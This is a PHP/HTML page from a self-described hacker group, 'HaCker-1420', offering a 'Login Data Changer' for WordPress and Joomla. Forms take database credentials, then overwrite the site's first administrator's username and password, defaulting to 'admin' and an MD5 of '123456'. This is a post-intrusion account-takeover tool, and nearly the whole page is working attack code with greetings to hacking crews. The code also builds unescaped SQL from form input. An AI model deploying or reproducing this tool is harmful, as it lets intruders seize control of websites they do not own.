<html dir="ltr">

<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>HaCker-1420 - Joomla & Wordpress Login data Changer</title>
<style>

</style>
</head>

<body text="#C0C0C0" bgcolor="#000000" link="#FFFFFF" vlink="#C0C0C0" alink="#FFFFFF">

<div align="center">
 <table border="1" width="98%" id="table1" dir="ltr" bgcolor="#404040" bordercolorlight="#FFFFFF" bordercolordark="#C0C0C0" bordercolor="#FFFFFF">
  <tr>
   <td>
   <p align="center"><b><font face=Webdings size=6>!</font><font face=Verdana size=5>HaCker-1420
   - Login Data Changer v1.0</font></b><font face=Webdings size=6><b>!</b></font></td>
  </tr>
 </table>
</div>

<div align="center">
 <table border="1" width="98%" id="table3" dir="ltr" bgcolor="#404040" bordercolorlight="#FFFFFF" bordercolordark="#C0C0C0" bordercolor="#FFFFFF">
  <tr>
   <td>
   <p align="center"><b><font face=Webdings size=6>!</font>Powered By 
   HaCker-1420--Dz hacker</b><font face=Webdings size=6><b>!</b></font></td>
  </tr>
 </table>
</div>

<div align="center">
 <table border="1" width="98%" id="table4" dir="ltr" bgcolor="#404040" bordercolorlight="#FFFFFF" bordercolordark="#C0C0C0" bordercolor="#FFFFFF" height="200">
  <tr>
   <td align="left" width="50%" valign="top">

<div align="center">
 <table border="1" width="100%" id="table5" dir="ltr" bgcolor="#404040" bordercolorlight="#FFFFFF" bordercolordark="#C0C0C0" bordercolor="#FFFFFF">
  <tr>
   <td bgcolor="#800000">
   <p align="center"><font color="#FFFFFF"><b>Wordpress Login Changer</b></font></td>
  </tr>
 </table>
</div>
   <p>
         <?
if(empty($_POST['pwd'])){
echo "<FORM method=\"POST\">
host     : <br> <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"****\"> <br>
database : <br> <INPUT size=\"15\" value=\"Database\" name=\"database\" type=\"****\"><br>
username : <br> <INPUT size=\"15\" value=\"Username\" name=\"username\" type=\"****\"><br>
password : <br> <INPUT size=\"15\" value=\"password\" name=\"password\" type=\"password\"><br>
      <br>
New username : <br> <INPUT name=\"admin\" size=\"15\" value=\"admin\"><br>
New password : <br> <INPUT name=\"pwd\" size=\"15\" value=\"admin\"><br>

<INPUT value=\"change\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd       = $_POST['pwd'];
$admin     = $_POST['admin'];


         @mysql_connect($localhost,$username,$password) or die(mysql_error());
         @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);

$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 1") or die(mysql_error());

if($a4s){
echo "<b>root@secure:# ~ Success : U Can Log In Using The New Data - Greetings From HaCker-1420</b> ";
}

}

?>
   
   </td>
   <td align="left" width="50%" valign="top">

<div align="center">
 <table border="1" width="100%" id="table6" dir="ltr" bgcolor="#404040" bordercolorlight="#FFFFFF" bordercolordark="#C0C0C0" bordercolor="#FFFFFF">
  <tr>
   <td bgcolor="#800000">
   <p align="center"><font color="#FFFFFF"><b>Joomla Login Changer</b></font></td>
  </tr>
 </table>
</div>
   <p>
   
    <?
if(empty($_POST['pwd'])){
echo "<FORM method=\"POST\">
host :<br> <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\"><br>
database :<br> <INPUT size=\"15\" value=\"database\" name=\"database\" type=\"text\"><br>
username :<br> <INPUT size=\"15\" value=\"db_user\" name=\"username\" type=\"text\"><br>
password :<br> <INPUT size=\"15\" value=\"password\" name=\"password\" type=\"password\"><br>
      <br>
New Username:<br> <INPUT name=\"admin\" size=\"15\" value=\"admin\"><br>
New Password: Use MD5 Hash or leave that, the new pass will be 123456<br> <INPUT name=\"pwd\" size=\"15\" value=\"e10adc3949ba59abbe56e057f20f883e\"><br>

<INPUT value=\"change\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd       = $_POST['pwd'];
$admin     = $_POST['admin'];


         @mysql_connect($localhost,$username,$password) or die(mysql_error());
         @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);

$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 1") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 1") or die(mysql_error());

if($SQL){
echo "<b>root@secure:# ~ Success : U Can Log In Using The New Data - Greetings From HaCker-1420</b> ";
}

}

?>
   
   </td>
  </tr>
 </table>
</div>

<div align="center">
 <table border="1" width="98%" id="table7" dir="ltr" bgcolor="#800000" bordercolorlight="#FFFFFF" bordercolordark="#C0C0C0" bordercolor="#FFFFFF" height="110">
  <tr>
   <td valign="top">
   <p align="center"><b><font color="#FFFFFF">Special Greets To : All 
   <a href="http://www.gaza-hacker.com/cc/"><font color="#000000">Gaza-hacker</font></a> members</font><br>
   <font face="Georgia" color="#FFFFFF">Th3 Viper - !-Bb0yH4cK3r_Dz-!- -- L3b-R1z-  <br> <font size="2">read our news at : 
   </font></font>
   <font face="Georgia" color="#FFFFFF" size="2">
   <a href="https://www.facebook.com/profile.php?id=100002945116030"><font color="#000000">Ozil.Mohamed</font></a></font></b></td>
  </tr>
 </table>
</div>

</body>

</html>


Ngu&#7891;n: http://junookyo.blogspot.com/2012_03_25_archive.html
